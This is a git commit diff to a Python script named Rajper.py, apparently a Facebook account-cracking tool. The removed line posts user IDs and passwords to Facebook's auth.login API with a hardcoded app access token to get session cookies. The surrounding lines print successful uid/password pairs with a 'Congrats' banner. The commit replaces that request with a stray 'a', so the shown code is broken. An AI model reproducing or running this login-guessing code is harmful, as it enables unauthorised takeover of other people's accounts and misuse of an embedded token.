aaccf8e176625802cfe1f2d9a468efc4db4757e1
Rajper-Rashid <109935742+Rajper-Rashid@users.noreply.github.com>
2022-07-25 13:12:48 +0500

    Update Rajper.py

--- Rajper.py
+++ Rajper.py
@@ -867,7 +867,7 @@ sys.stdout.write(
 			
 
 			
-			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
+a
 			if "session_key" in response.text and "EAAA" in response.text:
 				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-𝗥𝗮𝘀𝗵𝗶𝗱]%s | %s\033[1;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
